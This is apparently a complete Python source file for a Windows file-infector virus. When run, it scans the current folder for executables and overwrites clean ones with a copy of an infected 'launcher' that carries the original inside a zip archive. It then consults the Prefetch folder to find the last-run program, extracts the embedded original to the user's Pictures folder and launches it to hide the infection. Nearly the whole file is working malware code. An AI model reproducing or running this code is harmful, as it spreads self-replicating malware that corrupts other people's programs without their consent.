import zipfile, operator, itertools
import os, win32api, sys


class INF:
    ''' This is quite unstable...'''

    def __init__(self):
        try:
            # INSTALLATION
            self.install()
        except:
            pass

        try:
            # VERIFICATION
            self.verify()
        except:
            pass

    def install(self):
        # This list stores everything inside the current dir
        cd_list = os.listdir(os.getcwd())
        # This list will be used to store all the executables inside the current dir (list_all_exes)
        exe_list = list()
        # This list will be used to store all the infected files inside the current dir
        infected_list = list()
        # This list will be used to store all the clean files inside the current dir
        uninfected_list = list()

        def identify_launchers():
            ''' This function will identify the infected executables, appending them to a list,
            as well as the clean ones, also adding such files to a specific list. '''
            for i in range(len(exe_list)):
                try:
                    ''' All the launchers (infected files) should contain a file called "launcher.txt",
                    which doesn't need to store anything specific. This txt will "tell them apart". '''
                    with zipfile.ZipFile(exe_list[i], 'r') as f:
                        content_list = f.namelist()
                        f.close()
                    if 'launcher.txt' in content_list:
                        infected_list.append(exe_list[i])
                except:
                    uninfected_list.append(exe_list[i])

        def list_all_exes():
            # This function will add all the .exe files to the exe list
            for i in range(len(cd_list)):
                if cd_list[i][len(cd_list[i]) - 3:] == 'exe' and cd_list[i][0] \
                        and cd_list[i] != os.path.basename(sys.argv[0]):
                    exe_list.append(cd_list[i])

        def infect_files():
            ''' This function will infect the files from the uninfected list -
            they'll be appended a launcher.'''
            for i in range(len(uninfected_list)):
                win32api.CopyFile(infected_list[0], '.' + uninfected_list[i])
                with zipfile.ZipFile('.' + uninfected_list[i], 'a') as f:
                    f.write(uninfected_list[i])
                    f.close()
                win32api.DeleteFile(uninfected_list[i])
                # The MoveFile call renames the file back
                win32api.MoveFile('.' + uninfected_list[i], uninfected_list[i])

        list_all_exes()
        identify_launchers()
        infect_files()

    def verify(self):
        ''' This function checks if the current launcher has an exe attached to it.
        If so, it will extract and run such. '''

        # This Sleep call is necessary
        win32api.Sleep(5000)

        ''' This list will store everything inside the Prefetch folder.
        We'll use this do identify the last ran executable.'''
        exec_list = os.listdir('C:\Windows\Prefetch\\')

        dic = dict()
        for i in exec_list:
            dic[i] = os.stat('C:\Windows\Prefetch\\' + i).st_mtime
        # The last ran file is stored in here
        launcher = (sorted(dic.items(), key=operator.itemgetter(1), reverse=True)[:1])[0][0]


        def get_launcher_name():
            # This function will "refine" the launcher var.
            for i in range(len(launcher)):
                current_char = launcher.lower()[i]
                if current_char == '-':
                    launcher_nm_0 = launcher.lower()[:i]
                    launcher_nm_1 = list(
                        map(''.join, itertools.product(*((c.upper(), c.lower()) for c in launcher_nm_0))))
                    self.launcher_nm_3 = list(set(launcher_nm_1) & set(os.listdir(os.getcwd())))
                    if len(self.launcher_nm_3) != 0:
                        self.launcher_nm_3 = list(set(launcher_nm_1) & set(os.listdir(os.getcwd())))[0]
                    break

        def identify_launcher():
            # Checks if the last ran file is really a launcher.
            if len(self.launcher_nm_3) != 0:
                with zipfile.ZipFile(self.launcher_nm_3, 'r') as f:
                    if 'launcher.txt' in f.namelist():
                        return True
                    else:
                        return False

        get_launcher_name()

        if identify_launcher():
            # Extracts the last appended file to "C:\Users\%username%\Pictures" and runs it.
            # The host file (launcher) cannot be renamed after the infection!
            with zipfile.ZipFile(self.launcher_nm_3, 'r') as f:
                f.extract(self.launcher_nm_3, 'C:\\Users\\%s\\Pictures' % win32api.GetUserName())
                f.close()
            os.startfile('C:\\Users\\%s\\Pictures\\%s' % (win32api.GetUserName(), self.launcher_nm_3))


zz = INF()
